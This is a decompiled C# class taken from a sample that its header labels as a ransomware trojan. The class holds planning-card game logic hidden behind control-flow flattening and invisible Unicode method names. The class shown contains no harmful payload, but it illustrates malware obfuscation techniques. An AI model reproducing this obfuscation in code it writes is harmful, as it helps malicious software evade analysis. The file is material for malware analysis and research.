// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: CustomA, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 1ABC0B0F-8965-48BE-A39F-300B4A85D17D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-78d292113f7af44c7c14bdfb7bbae779df2f657bf2a687bc874dd6f9c9aecefd.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
      string str1 = (string) null;
label_1:
      int num1 = 2037284782;
      string str2;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1501201130)) % 12U)
        {
          case 0:
            num1 = (int) num2 * -752368059 ^ -624883609;
            continue;
          case 1:
            str1 = "6A4151504874";
            num1 = (int) num2 * 2111580471 ^ 1868798579;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * -2006257046 ^ 1607239386;
            continue;
          case 4:
            int num3 = BaseStream != 0 ? -1052988860 : (num3 = -1121825743);
            num1 = num3 ^ (int) num2 * -1453789062;
            continue;
          case 5:
            num1 = (int) num2 * 695972038 ^ -730478411;
            continue;
          case 6:
            flag = BaseStream == 1;
            num1 = 903252313;
            continue;
          case 7:
            str1 = "4944696374696F6E61";
            num1 = (int) num2 * 2117165079 ^ -638324625;
            continue;
          case 8:
            num1 = (int) num2 * 2059944963 ^ 1130368093;
            continue;
          case 10:
            str2 = str1;
            num1 = 560395982;
            continue;
          case 11:
            int num4 = !flag ? 101463074 : (num4 = 862357629);
            num1 = num4 ^ (int) num2 * -1160828822;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = -1475880246;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ -133690257)) % 5U)
        {
          case 0:
            num4 = 0;
            break;
          case 2:
            num1 = (int) num3 * 1920704773 ^ 246264503;
            continue;
          case 3:
            goto label_1;
          case 4:
            if (this.PlanningCards.Length != 0)
            {
              num4 = this.PlanningCards[cardTypeIndex];
              break;
            }
            num1 = (int) num3 * 2030167762 ^ 1927212689;
            continue;
          default:
            goto label_9;
        }
        num2 = num4;
        num1 = -885384129;
      }
label_9:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = -519288107;
        int num2;
        int planningCardsCount;
        bool flag;
        int index;
        int[] planningCards;
        int num3;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ -234069300)) % 13U)
          {
            case 0:
              ++index;
              num1 = -246125868;
              continue;
            case 1:
              num2 = 0;
              num1 = (int) num4 * -1596367403 ^ -1965772021;
              continue;
            case 2:
              num3 = planningCards[index];
              num1 = -1456369389;
              continue;
            case 3:
              num1 = (int) num4 * -2037853645 ^ 1842766337;
              continue;
            case 4:
              planningCards = this.PlanningCards;
              num1 = (int) num4 * -1244795448 ^ -419742496;
              continue;
            case 5:
              planningCardsCount = num2;
              num1 = (int) num4 * -441514038 ^ -1616623344;
              continue;
            case 6:
              flag = num3 > 0;
              num1 = (int) num4 * -1941448076 ^ 849470116;
              continue;
            case 8:
              int num5 = !flag ? 1915811288 : (num5 = 838087835);
              num1 = num5 ^ (int) num4 * -1801864928;
              continue;
            case 9:
              ++num2;
              num1 = (int) num4 * -1929254185 ^ -941284919;
              continue;
            case 10:
              goto label_1;
            case 11:
              index = 0;
              num1 = (int) num4 * 1429949992 ^ 1098016123;
              continue;
            case 12:
              int num6;
              num1 = num6 = index >= planningCards.Length ? -1071347912 : (num6 = -248748947);
              continue;
            default:
              goto label_14;
          }
        }
label_14:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = 1736326777;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1694839748)) % 4U)
        {
          case 0:
            num1 = (int) num2 * -734530753 ^ 1348283831;
            continue;
          case 1:
            num1 = (int) num2 * 359077437 ^ 377567993;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_3;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = 695647828;
      string str1;
      int index;
      int planningCard;
      bool flag1;
      bool flag2;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1072528382)) % 14U)
        {
          case 0:
            ++index;
            num1 = 237585435;
            continue;
          case 1:
            num1 = (int) num2 * -1333109535 ^ 1249004169;
            continue;
          case 2:
            str1 = " ";
            index = 0;
            num1 = (int) num2 * 1288616850 ^ 1329648461;
            continue;
          case 3:
            num1 = (int) num2 * -693365586 ^ -1574028934;
            continue;
          case 4:
            int num3 = !flag1 ? -1572685086 : (num3 = -1431522003);
            num1 = num3 ^ (int) num2 * -2014648290;
            continue;
          case 5:
            flag2 = index < this.PlanningCards.Length;
            num1 = 2081456712;
            continue;
          case 6:
            str1 = Player.\u206A‬⁫‏‍⁮⁬‌‌⁭‭⁫‏⁫⁮⁯‫​⁪⁯​‎⁬⁫‬‌‬⁫‬‭⁪⁮‎⁬⁯⁭​‬‫‍‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = 521084719;
            continue;
          case 7:
            str2 = str1;
            num1 = (int) num2 * 1542560740 ^ 56547738;
            continue;
          case 8:
            int num4 = flag2 ? 1480783324 : (num4 = 2053263563);
            num1 = num4 ^ (int) num2 * -1802993192;
            continue;
          case 9:
            flag1 = planningCard == 0;
            num1 = (int) num2 * -990821739 ^ 2058293813;
            continue;
          case 10:
            planningCard = this.PlanningCards[index];
            num1 = 91565015;
            continue;
          case 11:
            num1 = (int) num2 * 27834406 ^ -1259481455;
            continue;
          case 13:
            goto label_1;
          default:
            goto label_15;
        }
      }
label_15:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
      Player player = new Player()
      {
        Name = json["name"].Value,
        PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
        UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
      };
label_1:
      int num1 = -913407657;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2093668930)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 111973690 ^ -1802432229;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = 231764940;
      int count;
      int[] numArray;
      int aIndex;
      bool flag;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2105098685)) % 8U)
        {
          case 0:
            int num3 = flag ? 84947131 : (num3 = 1127303824);
            num1 = num3 ^ (int) num2 * -2101115482;
            continue;
          case 1:
            count = json.Count;
            numArray = new int[count];
            aIndex = 0;
            num1 = (int) num2 * -522557859 ^ 1746754651;
            continue;
          case 2:
            flag = aIndex < count;
            num1 = 141974629;
            continue;
          case 3:
            num1 = (int) num2 * -1741667889 ^ 1892218338;
            continue;
          case 4:
            goto label_1;
          case 5:
            planningCards = numArray;
            num1 = (int) num2 * 1678425638 ^ 1481495244;
            continue;
          case 6:
            numArray[aIndex] = json[aIndex].AsInt;
            ++aIndex;
            num1 = 313626855;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = 2098603897;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 951448798)) % 3U)
        {
          case 1:
            str = Player.\u206A⁮⁫​‮⁯​‎‬‫‬‏‍‮⁯‫‌⁭‪‍‪‫⁫⁭⁬‫​‏⁫‌‬⁯⁭‭‭‮⁬‮​‭‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * -898198146 ^ -21522345;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    static string \u206A‬⁫‏‍⁮⁬‌‌⁭‭⁫‏⁫⁮⁯‫​⁪⁯​‎⁬⁫‬‌‬⁫‬‭⁪⁮‎⁬⁯⁭​‬‫‍‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206A⁮⁫​‮⁯​‎‬‫‬‏‍‮⁯‫‌⁭‪‍‪‫⁫⁭⁬‫​‏⁫‌‬⁯⁭‭‭‮⁬‮​‭‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
